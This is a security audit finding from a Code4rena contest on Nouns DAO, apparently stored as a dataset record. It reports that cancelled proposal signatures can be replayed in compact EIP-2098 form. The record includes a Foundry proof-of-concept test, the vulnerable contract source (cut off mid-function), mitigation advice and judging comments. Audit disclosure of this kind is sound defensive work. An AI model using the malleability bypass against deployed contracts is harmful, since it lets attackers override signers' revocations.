{
  "Title": "[M-01] `cancelSig` will not completely cancel signatures due to malleability vulnerabilities",
  "Content": "\n<https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOV3Proposals.sol#L270-L275><br>\n<https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOV3Proposals.sol#L983>\n\nThe current version of openzeppelin contracts has a high risk of vulnerability about signature malleability attack: <https://github.com/OpenZeppelin/openzeppelin-contracts/pull/3610>.\n\nSo if the signer only cancel one signature, the malicious proposer can still extend a fully valid signature through the previous signature to pass the proposal.\n\n### Proof of Concept\n<details>\n \n```solidity\n// CancelProposalBySigs.t.sol\ncontract TestSignatureMalleabilityAttack is ZeroState {\n    function setUp() public virtual override {\n        super.setUp();\n\n        (signerWithVote, signerWithVotePK) = makeAddrAndKey('signerWithVote');\n\n        vm.startPrank(minter);\n        nounsToken.mint();\n        nounsToken.transferFrom(minter, signerWithVote, 1);\n        vm.roll(block.number + 1);\n        vm.stopPrank();\n\n        NounsDAOV3Proposals.ProposalTxs memory txs = makeTxs(makeAddr('target'), 0, '', '');\n        uint256 expirationTimestamp = block.timestamp + 1234;\n        NounsDAOStorageV3.ProposerSignature[] memory proposerSignatures = new NounsDAOStorageV3.ProposerSignature[](1);\n        bytes memory signature = signProposal(proposer, signerWithVotePK, txs, 'description', expirationTimestamp, address(dao));\n        vm.prank(signerWithVote);\n        dao.cancelSig(signature);\n\n        proposerSignatures[0] = NounsDAOStorageV3.ProposerSignature(\n            signature,\n            signerWithVote,\n            expirationTimestamp\n        );\n        vm.expectRevert(abi.encodeWithSelector(NounsDAOV3Proposals.SignatureIsCancelled.selector));\n        vm.prank(proposer);\n        proposalId = dao.proposeBySigs(\n            proposerSignatures,\n            txs.targets,\n            txs.values,\n            txs.signatures,\n            txs.calldatas,\n            'description'\n        );\n\n        proposerSignatures[0] = NounsDAOStorageV3.ProposerSignature(\n            to2098Format(signature),\n            signerWithVote,\n            expirationTimestamp\n        );\n        vm.prank(proposer);\n        proposalId = dao.proposeBySigs(\n            proposerSignatures,\n            txs.targets,\n            txs.values,\n            txs.signatures,\n            txs.calldatas,\n            'description'\n        );\n\n        vm.roll(block.number + 1);\n\n        assertEq(uint256(dao.state(proposalId)), uint256(NounsDAOStorageV3.ProposalState.Updatable));\n    }\n\n    // Copy from https://github.com/pcaversaccio/malleable-signatures/blob/1f618f556c0af48c44d27c7dbf1f97dc898ceda9/test/SignatureMalleability.t.sol#L78\n    error InvalidSignatureLength();\n    error InvalidSignatureSValue();\n    function to2098Format(bytes memory signature) internal view returns (bytes memory) {\n        if (signature.length != 65) revert InvalidSignatureLength();\n        if (uint8(signature[32]) >> 7 == 1) revert InvalidSignatureSValue();\n        bytes memory short = slice(signature, 0, 64);\n        uint8 parityBit = uint8(short[32]) | ((uint8(signature[64]) % 27) << 7);\n        short[32] = bytes1(parityBit);\n        return short;\n    }\n\n    // Copy from https://github.com/GNSPS/solidity-bytes-utils/blob/6458fb2780a3092bc756e737f246be1de6d3d362/contracts/BytesLib.sol#L228\n    function slice(\n        bytes memory _bytes,\n        uint256 _start,\n        uint256 _length\n    )\n        internal\n        pure\n        returns (bytes memory)\n    {\n        require(_length + 31 >= _length, \"slice_overflow\");\n        require(_bytes.length >= _start + _length, \"slice_outOfBounds\");\n\n        bytes memory tempBytes;\n\n        assembly {\n            switch iszero(_length)\n            case 0 {\n                // Get a location of some free memory and store it in tempBytes as\n                // Solidity does for memory variables.\n                tempBytes := mload(0x40)\n\n                // The first word of the slice result is potentially a partial\n                // word read from the original array. To read it, we calculate\n                // the length of that partial word and start copying that many\n                // bytes into the array. The first word we copy will start with\n                // data we don't care about, but the last `lengthmod` bytes will\n                // land at the beginning of the contents of the new array. When\n                // we're done copying, we overwrite the full first word with\n                // the actual length of the slice.\n                let lengthmod := and(_length, 31)\n\n                // The multiplication in the next line is necessary\n                // because when slicing multiples of 32 bytes (lengthmod == 0)\n                // the following copy loop was copying the origin's length\n                // and then ending prematurely not copying everything it should.\n                let mc := add(add(tempBytes, lengthmod), mul(0x20, iszero(lengthmod)))\n                let end := add(mc, _length)\n\n                for {\n                    // The multiplication in the next line has the same exact purpose\n                    // as the one above.\n                    let cc := add(add(add(_bytes, lengthmod), mul(0x20, iszero(lengthmod))), _start)\n                } lt(mc, end) {\n                    mc := add(mc, 0x20)\n                    cc := add(cc, 0x20)\n                } {\n                    mstore(mc, mload(cc))\n                }\n\n                mstore(tempBytes, _length)\n\n                //update free-memory pointer\n                //allocating the array padded to 32 bytes like the compiler does now\n                mstore(0x40, and(add(mc, 31), not(31)))\n            }\n            //if we want a zero-length slice let's just return a zero-length array\n            default {\n                tempBytes := mload(0x40)\n                //zero out the 32 bytes slice we are about to return\n                //we need to do it because Solidity does not garbage collect\n                mstore(tempBytes, 0)\n\n                mstore(0x40, add(tempBytes, 0x20))\n            }\n        }\n\n        return tempBytes;\n    }\n\n    function testAttack() public {}\n}\n```\n\n```shell\nforge test --match-test testAttack -vvvv --ffi\n```\n\n</details>\n\n### Tools Used\n\nFoundry\n\n### Recommended Mitigation Steps\n\nUpdate openzeppelin contracts to the new version.\n\n**[eladmallel (Nouns DAO) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/198#issuecomment-1644632754):**\n > Fix PR here: https://github.com/nounsDAO/nouns-monorepo/pull/761\n> \n> However, think severity should not be high. The worst case here is a signature abuse leads to a proposal going on chain, still subject to the proposal lifecycle, including quorum and voting.\n\n**[davidbrai (Nouns DAO) commented](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/198#issuecomment-1645332715):**\n > Another point regarding severity:<br>\n> The signer can also move their tokens to another address as a way to make the previous signature not useful.\n\n**[gzeon (judge) decreased severity to Low and commented](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/198#issuecomment-1647352618):**\n > Downgrading to Low since no asset will be at risk and require a user error.\n\n**[gzeon (judge) increased severity to Medium and commented](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/198#issuecomment-1650631261):**\n > It is worth to note this is atypical in Code4rena judging, and should not be considered as a precedence for future contests. [Signature malleability](https://gist.github.com/CloudEllie/deb7d1c9c91b605555cbe604662e58cf#low5-use-of-ecrecover-is-susceptible-to-signature-malleability), or [outdated OZ dependency](https://gist.github.com/CloudEllie/deb7d1c9c91b605555cbe604662e58cf#low25-upgrade-openzeppelin-contract-dependency) are generally considered as out-of-scope in C4 contests as they are covered by the bot report. This report is special in the sense that while the project already used the recommended OZ ECDSA library, the specific version they used contained a bug that allow malleability, which the warden provided a POC with meaningful impact. I am keeping this as Medium risk for the above reason and sponsor opinion.\n\n\n\n***\n\n",
  "Impact": "MEDIUM",
  "Source": "https://code4rena.com/reports/2023-07-nounsdao",
  "Code": [
    {
      "filename": "packages/nouns-contracts/contracts/governance/NounsDAOV3Proposals.sol",
      "content": "// SPDX-License-Identifier: GPL-3.0\n\n/// @title Library for NounsDAOLogicV3 contract containing the proposal lifecycle code\n\n/*********************************\n * ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ *\n * ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ *\n * ░░░░░░█████████░░█████████░░░ *\n * ░░░░░░██░░░████░░██░░░████░░░ *\n * ░░██████░░░████████░░░████░░░ *\n * ░░██░░██░░░████░░██░░░████░░░ *\n * ░░██░░██░░░████░░██░░░████░░░ *\n * ░░░░░░█████████░░█████████░░░ *\n * ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ *\n * ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ *\n *********************************/\n\npragma solidity ^0.8.19;\n\nimport './NounsDAOInterfaces.sol';\nimport { NounsDAOV3DynamicQuorum } from './NounsDAOV3DynamicQuorum.sol';\nimport { NounsDAOV3Fork } from './fork/NounsDAOV3Fork.sol';\nimport { SignatureChecker } from '@openzeppelin/contracts/utils/cryptography/SignatureChecker.sol';\nimport { ECDSA } from '@openzeppelin/contracts/utils/cryptography/ECDSA.sol';\nimport { SafeCast } from '@openzeppelin/contracts/utils/math/SafeCast.sol';\n\nlibrary NounsDAOV3Proposals {\n    using NounsDAOV3DynamicQuorum for NounsDAOStorageV3.StorageV3;\n    using NounsDAOV3Fork for NounsDAOStorageV3.StorageV3;\n\n    error CantCancelProposalAtFinalState();\n    error ProposalInfoArityMismatch();\n    error MustProvideActions();\n    error TooManyActions();\n    error ProposerAlreadyHasALiveProposal();\n    error InvalidSignature();\n    error SignatureExpired();\n    error CanOnlyEditUpdatableProposals();\n    error OnlyProposerCanEdit();\n    error SignerCountMismtach();\n    error ProposerCannotUpdateProposalWithSigners();\n    error MustProvideSignatures();\n    error SignatureIsCancelled();\n    error CannotExecuteDuringForkingPeriod();\n    error VetoerBurned();\n    error VetoerOnly();\n    error CantVetoExecutedProposal();\n    error VotesBelowProposalThreshold();\n\n    /// @notice An event emitted when a proposal has been vetoed by vetoAddress\n    event ProposalVetoed(uint256 id);\n\n    /// @notice An event emitted when a new proposal is created\n    event ProposalCreated(\n        uint256 id,\n        address proposer,\n        address[] targets,\n        uint256[] values,\n        string[] signatures,\n        bytes[] calldatas,\n        uint256 startBlock,\n        uint256 endBlock,\n        string description\n    );\n\n    /// @notice An event emitted when a new proposal is created, which includes additional information\n    /// @dev V3 adds `signers`, `updatePeriodEndBlock` compared to the V1/V2 event.\n    event ProposalCreatedWithRequirements(\n        uint256 id,\n        address proposer,\n        address[] signers,\n        address[] targets,\n        uint256[] values,\n        string[] signatures,\n        bytes[] calldatas,\n        uint256 startBlock,\n        uint256 endBlock,\n        uint256 updatePeriodEndBlock,\n        uint256 proposalThreshold,\n        uint256 quorumVotes,\n        string description\n    );\n\n    /// @notice Emitted when a proposal is created to be executed on timelockV1\n    event ProposalCreatedOnTimelockV1(uint256 id);\n\n    /// @notice Emitted when a proposal is updated\n    event ProposalUpdated(\n        uint256 indexed id,\n        address indexed proposer,\n        address[] targets,\n        uint256[] values,\n        string[] signatures,\n        bytes[] calldatas,\n        string description,\n        string updateMessage\n    );\n\n    /// @notice Emitted when a proposal's transactions are updated\n    event ProposalTransactionsUpdated(\n        uint256 indexed id,\n        address indexed proposer,\n        address[] targets,\n        uint256[] values,\n        string[] signatures,\n        bytes[] calldatas,\n        string updateMessage\n    );\n\n    /// @notice Emitted when a proposal's description is updated\n    event ProposalDescriptionUpdated(\n        uint256 indexed id,\n        address indexed proposer,\n        string description,\n        string updateMessage\n    );\n\n    /// @notice An event emitted when a proposal has been queued in the NounsDAOExecutor\n    event ProposalQueued(uint256 id, uint256 eta);\n\n    /// @notice An event emitted when a proposal has been executed in the NounsDAOExecutor\n    event ProposalExecuted(uint256 id);\n\n    /// @notice An event emitted when a proposal has been canceled\n    event ProposalCanceled(uint256 id);\n\n    /// @notice Emitted when someone cancels a signature\n    event SignatureCancelled(address indexed signer, bytes sig);\n\n    // Created to solve stack-too-deep errors\n    struct ProposalTxs {\n        address[] targets;\n        uint256[] values;\n        string[] signatures;\n        bytes[] calldatas;\n    }\n\n    /// @notice The maximum number of actions that can be included in a proposal\n    uint256 public constant PROPOSAL_MAX_OPERATIONS = 10; // 10 actions\n\n    bytes32 public constant DOMAIN_TYPEHASH =\n        keccak256('EIP712Domain(string name,uint256 chainId,address verifyingContract)');\n\n    bytes32 public constant PROPOSAL_TYPEHASH =\n        keccak256(\n            'Proposal(address proposer,address[] targets,uint256[] values,string[] signatures,bytes[] calldatas,string description,uint256 expiry)'\n        );\n\n    bytes32 public constant UPDATE_PROPOSAL_TYPEHASH =\n        keccak256(\n            'UpdateProposal(uint256 proposalId,address proposer,address[] targets,uint256[] values,string[] signatures,bytes[] calldatas,string description,uint256 expiry)'\n        );\n\n    /**\n     * @notice Function used to propose a new proposal. Sender must have delegates above the proposal threshold\n     * @param txs Target addresses, eth values, function signatures and calldatas for proposal calls\n     * @param description String description of the proposal\n     * @return Proposal id of new proposal\n     */\n    function propose(\n        NounsDAOStorageV3.StorageV3 storage ds,\n        ProposalTxs memory txs,\n        string memory description\n    ) internal returns (uint256) {\n        uint256 adjustedTotalSupply = ds.adjustedTotalSupply();\n        uint256 proposalThreshold_ = checkPropThreshold(\n            ds,\n            ds.nouns.getPriorVotes(msg.sender, block.number - 1),\n            adjustedTotalSupply\n        );\n        checkProposalTxs(txs);\n        checkNoActiveProp(ds, msg.sender);\n\n        uint256 proposalId = ds.proposalCount = ds.proposalCount + 1;\n        NounsDAOStorageV3.Proposal storage newProposal = createNewProposal(\n            ds,\n            proposalId,\n            proposalThreshold_,\n            adjustedTotalSupply,\n            txs\n        );\n        ds.latestProposalIds[msg.sender] = proposalId;\n\n        emitNewPropEvents(newProposal, new address[](0), ds.minQuorumVotes(adjustedTotalSupply), txs, description);\n\n        return proposalId;\n    }\n\n    /**\n     * @notice Function used to propose a new proposal. Sender must have delegates above the proposal threshold.\n     * This proposal would be executed via the timelockV1 contract. This is meant to be used in case timelockV1\n     * is still holding funds or has special permissions to execute on certain contracts.\n     * @param txs Target addresses, eth values, function signatures and calldatas for proposal calls\n     * @param description String description of the proposal\n     * @return uint256 Proposal id of new proposal\n     */\n    function proposeOnTimelockV1(\n        NounsDAOStorageV3.StorageV3 storage ds,\n        ProposalTxs memory txs,\n        string memory description\n    ) internal returns (uint256) {\n        uint256 newProposalId = propose(ds, txs, description);\n\n        NounsDAOStorageV3.Proposal storage newProposal = ds._proposals[newProposalId];\n        newProposal.executeOnTimelockV1 = true;\n\n        emit ProposalCreatedOnTimelockV1(newProposalId);\n\n        return newProposalId;\n    }\n\n    /**\n     * @notice Function used to propose a new proposal. Sender and signers must have delegates above the proposal threshold\n     * @param proposerSignatures Array of signers who have signed the proposal and their signatures.\n     * @dev The signatures follow EIP-712. See `PROPOSAL_TYPEHASH` in NounsDAOV3Proposals.sol\n     * @param txs Target addresses, eth values, function signatures and calldatas for proposal calls\n     * @param description String description of the proposal\n     * @return uint256 Proposal id of new proposal\n     */\n    function proposeBySigs(\n        NounsDAOStorageV3.StorageV3 storage ds,\n        NounsDAOStorageV3.ProposerSignature[] memory proposerSignatures,\n        ProposalTxs memory txs,\n        string memory description\n    ) external returns (uint256) {\n        if (proposerSignatures.length == 0) revert MustProvideSignatures();\n        checkProposalTxs(txs);\n        uint256 proposalId = ds.proposalCount = ds.proposalCount + 1;\n\n        uint256 adjustedTotalSupply = ds.adjustedTotalSupply();\n\n        uint256 propThreshold = proposalThreshold(ds, adjustedTotalSupply);\n\n        NounsDAOStorageV3.Proposal storage newProposal = createNewProposal(\n            ds,\n            proposalId,\n            propThreshold,\n            adjustedTotalSupply,\n            txs\n        );\n\n        // important that the proposal is created before the verification call in order to ensure\n        // the same signer is not trying to sign this proposal more than once\n        (uint256 votes, address[] memory signers) = verifySignersCanBackThisProposalAndCountTheirVotes(\n            ds,\n            proposerSignatures,\n            txs,\n            description,\n            proposalId\n        );\n        if (signers.length == 0) revert MustProvideSignatures();\n        if (votes <= propThreshold) revert VotesBelowProposalThreshold();\n\n        newProposal.signers = signers;\n\n        emitNewPropEvents(newProposal, signers, ds.minQuorumVotes(adjustedTotalSupply), txs, description);\n\n        return proposalId;\n    }\n\n    /**\n     * @notice Invalidates a signature that may be used for signing a proposal.\n     * Once a signature is canceled, the sender can no longer use it again.\n     * If the sender changes their mind and want to sign the proposal, they can change the expiry timestamp\n     * in order to produce a new signature.\n     * The signature will only be invalidated when used by the sender. If used by a different account, it will\n     * not be invalidated.\n     * @param sig The signature to cancel\n     */\n    function cancelSig(NounsDAOStorageV3.StorageV3 storage ds, bytes calldata sig) external {\n        bytes32 sigHash = keccak256(sig);\n        ds.cancelledSigs[msg.sender][sigHash] = true;\n\n        emit SignatureCancelled(msg.sender, sig);\n    }\n\n    /**\n     * @notice Update a proposal transactions and description.\n     * Only the proposer can update it, and only during the updateable period.\n     * @param proposalId Proposal's id\n     * @param targets Updated target addresses for proposal calls\n     * @param values Updated eth values for proposal calls\n     * @param signatures Updated function signatures for proposal calls\n     * @param calldatas Updated calldatas for proposal calls\n     * @param description Updated description of the proposal\n     * @param updateMessage Short message to explain the update\n     */\n    function updateProposal(\n        NounsDAOStorageV3.StorageV3 storage ds,\n        uint256 proposalId,\n        address[] memory targets,\n        uint256[] memory values,\n        string[] memory signatures,\n        bytes[] memory calldatas,\n        string memory description,\n        string memory updateMessage\n    ) external {\n        updateProposalTransactionsInternal(ds, proposalId, targets, values, signatures, calldatas);\n\n        emit ProposalUpdated(\n            proposalId,\n            msg.sender,\n            targets,\n            values,\n            signatures,\n            calldatas,\n            description,\n            updateMessage\n        );\n    }\n\n    /**\n     * @notice Updates the proposal's transactions. Only the proposer can update it, and only during the updateable period.\n     * @param proposalId Proposal's id\n     * @param targets Updated target addresses for proposal calls\n     * @param values Updated eth values for proposal calls\n     * @param signatures Updated function signatures for proposal calls\n     * @param calldatas Updated calldatas for proposal calls\n     * @param updateMessage Short message to explain the update\n     */\n    function updateProposalTransactions(\n        NounsDAOStorageV3.StorageV3 storage ds,\n        uint256 proposalId,\n        address[] memory targets,\n        uint256[] memory values,\n        string[] memory signatures,\n        bytes[] memory calldatas,\n        string memory updateMessage\n    ) external {\n        updateProposalTransactionsInternal(ds, proposalId, targets, values, signatures, calldatas);\n\n        emit ProposalTransactionsUpdated(proposalId, msg.sender, targets, values, signatures, calldatas, updateMessage);\n    }\n\n    function updateProposalTransactionsInternal(\n        NounsDAOStorageV3.StorageV3 storage ds,\n        uint256 proposalId,\n        address[] memory targets,\n        uint256[] memory values,\n        string[] memory signatures,\n        bytes[] memory calldatas\n    ) internal {\n        checkProposalTxs(ProposalTxs(targets, values, signatures, calldatas));\n\n        NounsDAOStorageV3.Proposal storage proposal = ds._proposals[proposalId];\n        checkProposalUpdatable(ds, proposalId, proposal);\n\n        proposal.targets = targets;\n        proposal.values = values;\n        proposal.signatures = signatures;\n        proposal.calldatas = calldatas;\n    }\n\n    /**\n     * @notice Updates the proposal's description. Only the proposer can update it, and only during the updateable period.\n     * @param proposalId Proposal's id\n     * @param description Updated description of the proposal\n     * @param updateMessage Short message to explain the update\n     */\n    function updateProposalDescription(\n        NounsDAOStorageV3.StorageV3 storage ds,\n        uint256 proposalId,\n        string calldata description,\n        string calldata updateMessage\n    ) external {\n        NounsDAOStorageV3.Proposal storage proposal = ds._proposals[proposalId];\n        checkProposalUpdatable(ds, proposalId, proposal);\n\n        emit ProposalDescriptionUpdated(proposalId, msg.sender, description, updateMessage);\n    }\n\n    /**\n     * @notice Update a proposal's transactions and description that was created with proposeBySigs.\n     * Only the proposer can update it, during the updateable period.\n     * Requires the original signers to sign the update.\n     * @param proposalId Proposal's id\n     * @param proposerSignatures Array of signers who have signed the proposal and their signatures.\n     * @dev The signatures follow EIP-712. See `UPDATE_PROPOSAL_TYPEHASH` in NounsDAOV3Proposals.sol\n     * @param txs Updated transactions for the proposal\n     * @param description Updated description of the proposal\n     * @param updateMessage Short message to explain the update\n     */\n    function updateProposalBySigs(\n        NounsDAOStorageV3.StorageV3 storage ds,\n        uint256 proposalId,\n        NounsDAOStorageV3.ProposerSignature[] memory proposerSignatures,\n        ProposalTxs memory txs,\n        string memory description,\n        string memory updateMessage\n    ) external {\n        checkProposalTxs(txs);\n        // without this check it's possible to run through this function and update a proposal without signatures\n        // this problem doesn't exist in the propose function because we check for prop threshold there\n        if (proposerSignatures.length == 0) revert MustProvideSignatures();\n\n        NounsDAOStorageV3.Proposal storage proposal = ds._proposals[proposalId];\n        if (stateInternal(ds, proposalId) != NounsDAOStorageV3.ProposalState.Updatable)\n            revert CanOnlyEditUpdatableProposals();\n        if (msg.sender != proposal.proposer) revert OnlyProposerCanEdit();\n\n        address[] memory signers = proposal.signers;\n        if (proposerSignatures.length != signers.length) revert SignerCountMismtach();\n\n        bytes memory proposalEncodeData = abi.encodePacked(\n            proposalId,\n            calcProposalEncodeData(msg.sender, txs, description)\n        );\n\n        for (uint256 i = 0; i < proposerSignatures.length; ++i) {\n            verifyProposalSignature(ds, proposalEncodeData, proposerSignatures[i], UPDATE_PROPOSAL_TYPEHASH);\n\n            // To avoid the gas cost of having to search signers in proposal.signers, we're assuming the sigs we get\n            // use the same amount of signers and the same order.\n            if (signers[i] != proposerSignatures[i].signer) revert OnlyProposerCanEdit();\n        }\n\n        proposal.targets = txs.targets;\n        proposal.values = txs.values;\n        proposal.signatures = txs.signatures;\n        proposal.calldatas = txs.calldatas;\n\n        emit ProposalUpdated(\n            proposalId,\n            msg.sender,\n            txs.targets,\n            txs.values,\n            txs.signatures,\n            txs.calldatas,\n            description,\n            updateMessage\n        );\n    }\n\n    /**\n     * @notice Queues a proposal of state succeeded\n     * @param proposalId The id of the proposal to queue\n     */\n    function queue(NounsDAOStorageV3.StorageV3 storage ds, uint256 proposalId) external {\n        require(\n            stateInternal(ds, proposalId) == NounsDAOStorageV3.ProposalState.Succeeded,\n            'NounsDAO::queue: proposal can only be queued if it is succeeded'\n        );\n        NounsDAOStorageV3.Proposal storage proposal = ds._proposals[proposalId];\n        INounsDAOExecutor timelock = getProposalTimelock(ds, proposal);\n        uint256 eta = block.timestamp + timelock.delay();\n        for (uint256 i = 0; i < proposal.targets.length; i++) {\n            queueOrRevertInternal(\n                timelock,\n                proposal.targets[i],\n                proposal.values[i],\n                proposal.signatures[i],\n                proposal.calldatas[i],\n                eta\n            );\n        }\n        proposal.eta = eta;\n        emit ProposalQueued(proposalId, eta);\n    }\n\n    function queueOrRevertInternal(\n        INounsDAOExecutor timelock,\n        address target,\n        uint256 value,\n        string memory signature,\n        bytes memory data,\n        uint256 eta\n    ) internal {\n        require(\n            !timelock.queuedTransactions(keccak256(abi.encode(target, value, signature, data, eta))),\n            'NounsDAO::queueOrRevertInternal: identical proposal action already queued at eta'\n        );\n        timelock.queueTransaction(target, value, signature, data, eta);\n    }\n\n    /**\n     * @notice Executes a queued proposal if eta has passed\n     * @param proposalId The id of the proposal to execute\n     */\n    function execute(NounsDAOStorageV3.StorageV3 storage ds, uint256 proposalId) external {\n        NounsDAOStorageV3.Proposal storage proposal = ds._proposals[proposalId];\n        INounsDAOExecutor timelock = getProposalTimelock(ds, proposal);\n        executeInternal(ds, proposal, timelock);\n    }\n\n    /**\n     * @notice Executes a queued proposal on timelockV1 if eta has passed\n     * This is only required for proposal that were queued on timelockV1, but before the upgrade to DAO V3.\n     * These proposals will not have the `executeOnTimelockV1` bool turned on.\n     */\n    function executeOnTimelockV1(NounsDAOStorageV3.StorageV3 storage ds, uint256 proposalId) external {\n        NounsDAOStorageV3.Proposal storage proposal = ds._proposals[proposalId];\n        executeInternal(ds, proposal, ds.timelockV1);\n    }\n\n    function executeInternal(\n        NounsDAOStorageV3.StorageV3 storage ds,\n        NounsDAOStorageV3.Proposal storage proposal,\n        INounsDAOExecutor timelock\n    ) internal {\n        require(\n            stateInternal(ds, proposal.id) == NounsDAOStorageV3.ProposalState.Queued,\n            'NounsDAO::execute: proposal can only be executed if it is queued'\n        );\n        if (ds.isForkPeriodActive()) revert CannotExecuteDuringForkingPeriod();\n\n        proposal.executed = true;\n\n        for (uint256 i = 0; i < proposal.targets.length; i++) {\n            timelock.executeTransaction(\n                proposal.targets[i],\n                proposal.values[i],\n                proposal.signatures[i],\n                proposal.calldatas[i],\n                proposal.eta\n            );\n        }\n        emit ProposalExecuted(proposal.id);\n    }\n\n    function getProposalTimelock(NounsDAOStorageV3.StorageV3 storage ds, NounsDAOStorageV3.Proposal storage proposal)\n        internal\n        view\n        returns (INounsDAOExecutor)\n    {\n        if (proposal.executeOnTimelockV1) {\n            return ds.timelockV1;\n        } else {\n            return ds.timelock;\n        }\n    }\n\n    /**\n     * @notice Vetoes a proposal only if sender is the vetoer and the proposal has not been executed.\n     * @param proposalId The id of the proposal to veto\n     */\n    function veto(NounsDAOStorageV3.StorageV3 storage ds, uint256 proposalId) external {\n        if (ds.vetoer == address(0)) {\n            revert VetoerBurned();\n        }\n\n        if (msg.sender != ds.vetoer) {\n            revert VetoerOnly();\n        }\n\n        if (stateInternal(ds, proposalId) == NounsDAOStorageV3.ProposalState.Executed) {\n            revert CantVetoExecutedProposal();\n        }\n\n        NounsDAOStorageV3.Proposal storage proposal = ds._proposals[proposalId];\n\n        proposal.vetoed = true;\n        INounsDAOExecutor timelock = getProposalTimelock(ds, proposal);\n        for (uint256 i = 0; i < proposal.targets.length; i++) {\n            timelock.cancelTransaction(\n                proposal.targets[i],\n                proposal.values[i],\n                proposal.signatures[i],\n                proposal.calldatas[i],\n                proposal.eta\n            );\n        }\n\n        emit ProposalVetoed(proposalId);\n    }\n\n    /**\n     * @notice Cancels a proposal only if sender is the proposer or a signer, or proposer & signers voting power\n     * dropped below proposal threshold\n     * @param proposalId The id of the proposal to cancel\n     */\n    function cancel(NounsDAOStorageV3.StorageV3 storage ds, uint256 proposalId) external {\n        NounsDAOStorageV3.ProposalState proposalState = stateInternal(ds, proposalId);\n        if (\n            proposalState == NounsDAOStorageV3.ProposalState.Canceled ||\n            proposalState == NounsDAOStorageV3.ProposalState.Defeated ||\n            proposalState == NounsDAOStorageV3.ProposalState.Expired ||\n            proposalState == NounsDAOStorageV3.ProposalState.Executed ||\n            proposalState == NounsDAOStorageV3.ProposalState.Vetoed\n        ) {\n            revert CantCancelProposalAtFinalState();\n        }\n\n        NounsDAOStorageV3.Proposal storage proposal = ds._proposals[proposalId];\n        address proposer = proposal.proposer;\n        NounsTokenLike nouns = ds.nouns;\n\n        uint256 votes = nouns.getPriorVotes(proposer, block.number - 1);\n        bool msgSenderIsProposer = proposer == msg.sender;\n        address[] memory signers = proposal.signers;\n        for (uint256 i = 0; i < signers.length; ++i) {\n            msgSenderIsProposer = msgSenderIsProposer || msg.sender == signers[i];\n            votes += nouns.getPriorVotes(signers[i], block.number - 1);\n        }\n\n        require(\n            msgSenderIsProposer || votes <= proposal.proposalThreshold,\n            'NounsDAO::cancel: proposer above threshold'\n        );\n\n        proposal.canceled = true;\n        INounsDAOExecutor timelock = getProposalTimelock(ds, proposal);\n        for (uint256 i = 0; i < proposal.targets.length; i++) {\n            timelock.cancelTransaction(\n                proposal.targets[i],\n                proposal.values[i],\n                proposal.signatures[i],\n                proposal.calldatas[i],\n                proposal.eta\n            );\n        }\n\n        emit ProposalCanceled(proposalId);\n    }\n\n    /**\n     * @notice Gets the state of a proposal\n     * @param ds the DAO's state struct\n     * @param proposalId The id of the proposal\n     * @return Proposal state\n     */\n    function state(NounsDAOStorageV3.StorageV3 storage ds, uint256 proposalId)\n        public\n        view\n        returns (NounsDAOStorageV3.ProposalState)\n    {\n        return stateInternal(ds, proposalId);\n    }\n\n    /**\n     * @notice Gets the state of a proposal\n     * @dev This internal function is used by other libraries to embed in compile time and save the runtime gas cost of a delegate call\n     * @param ds the DAO's state struct\n     * @param proposalId The id of the proposal\n     * @return Proposal state\n     */\n    function stateInternal(NounsDAOStorageV3.StorageV3 storage ds, uint256 proposalId)\n        internal\n        view\n        returns (NounsDAOStorageV3.ProposalState)\n    {\n        require(ds.proposalCount >= proposalId, 'NounsDAO::state: invalid proposal id');\n        NounsDAOStorageV3.Proposal storage proposal = ds._proposals[proposalId];\n\n        if (proposal.vetoed) {\n            return NounsDAOStorageV3.ProposalState.Vetoed;\n        } else if (proposal.canceled) {\n            return NounsDAOStorageV3.ProposalState.Canceled;\n        } else if (block.number <= proposal.updatePeriodEndBlock) {\n            return NounsDAOStorageV3.ProposalState.Updatable;\n        } else if (block.number <= proposal.startBlock) {\n            return NounsDAOStorageV3.ProposalState.Pending;\n        } else if (block.number <= proposal.endBlock) {\n            return NounsDAOStorageV3.ProposalState.Active;\n        } else if (block.number <= proposal.objectionPeriodEndBlock) {\n            return NounsDAOStorageV3.ProposalState.ObjectionPeriod;\n        } else if (isDefeated(ds, proposal)) {\n            return NounsDAOStorageV3.ProposalState.Defeated;\n        } else if (proposal.eta == 0) {\n            return NounsDAOStorageV3.ProposalState.Succeeded;\n        } else if (proposal.executed) {\n            return NounsDAOStorageV3.ProposalState.Executed;\n        } else if (block.timestamp >= proposal.eta + getProposalTimelock(ds, proposal).GRACE_PERIOD()) {\n            return NounsDAOStorageV3.ProposalState.Expired;\n        } else {\n            return NounsDAOStorageV3.ProposalState.Queued;\n        }\n    }\n\n    /**\n     * @notice Gets actions of a proposal\n     * @param proposalId the id of the proposal\n     * @return targets\n     * @return values\n     * @return signatures\n     * @return calldatas\n     */\n    function getActions(NounsDAOStorageV3.StorageV3 storage ds, uint256 proposalId)\n        internal\n        view\n        returns (\n            address[] memory targets,\n            uint256[] memory values,\n            string[] memory signatures,\n            bytes[] memory calldatas\n        )\n    {\n        NounsDAOStorageV3.Proposal storage p = ds._proposals[proposalId];\n        return (p.targets, p.values, p.signatures, p.calldatas);\n    }\n\n    /**\n     * @notice Gets the receipt for a voter on a given proposal\n     * @param proposalId the id of proposal\n     * @param voter The address of the voter\n     * @return The voting receipt\n     */\n    function getReceipt(\n        NounsDAOStorageV3.StorageV3 storage ds,\n        uint256 proposalId,\n        address voter\n    ) internal view returns (NounsDAOStorageV3.Receipt memory) {\n        return ds._proposals[proposalId].receipts[voter];\n    }\n\n    /**\n     * @notice Returns the proposal details given a proposal id.\n     *     The `quorumVotes` member holds the *current* quorum, given the current votes.\n     * @param proposalId the proposal id to get the data for\n     * @return A `ProposalCondensed` struct with the proposal data\n     */\n    function proposals(NounsDAOStorageV3.StorageV3 storage ds, uint256 proposalId)\n        external\n        view\n        returns (NounsDAOStorageV2.ProposalCondensed memory)\n    {\n        NounsDAOStorageV3.Proposal storage proposal = ds._proposals[proposalId];\n        return\n            NounsDAOStorageV2.ProposalCondensed({\n                